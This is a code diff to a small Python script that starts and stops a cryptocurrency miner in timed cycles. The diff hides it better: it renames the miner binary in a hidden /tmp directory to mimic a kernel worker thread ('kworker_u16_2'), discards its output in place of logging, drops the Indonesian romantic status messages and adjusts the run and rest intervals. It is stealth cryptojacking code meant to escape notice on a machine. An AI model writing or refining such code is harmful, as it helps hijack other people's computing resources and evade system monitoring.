@@ -3,34 +3,26 @@ import time
 import sys
 
 # CONFIG
-MINER_PATH = "/tmp/.cache/tobrut"  # Lokasi miner
-MINING_TIME = 3600  # 60 menit
-REST_TIME = 300  # 5 menit
-LOG_PATH = "/tmp/.cache/logs/sayangku.log"
+MINER_PATH = "/tmp/.cache/kworker_u16_2"  # Lokasi miner
+MINING_TIME = 2700  # 45 menit
+REST_TIME = 600  # 10 menit
 
 def kill_miner():
-    print("💔 Mesin udah capek, aku kill langsung tanpa pikir panjang sayang...")
-    os.system("pkill -f tobrut")
-    sys.stdout.flush()
+    os.system("pkill -f kworker_u16_2")
 
 def start_miner():
-    print("🚀 Menjalankan Panen buat rumah kita di Bali...")
-    os.system(f"nohup {MINER_PATH} > {LOG_PATH} 2>&1 &")
-    sys.stdout.flush()
+    exit_code = os.system(f"nohup {MINER_PATH} > /dev/null 2>&1 &")
+    if exit_code != 0:
+        print("❌ Gagal menjalankan miner!", file=sys.stderr)
+        sys.stderr.flush()
 
 def main():
     while True:
-        print("⛏️ Panen selama 60 menit buat modal nikah kita...")
         start_miner()
         time.sleep(MINING_TIME)
 
-        print("💔 Mesin udah capek, aku kill ya sayang...")
         kill_miner()
-
-        print("😴 Istirahat dulu 5 menit biar hash kita fresh...")
         time.sleep(REST_TIME)
 
 if __name__ == "__main__":
-    print("💓 Cinta Abadi v6 Jalan Sayangku... 💕")
-    sys.stdout.flush()
     main()
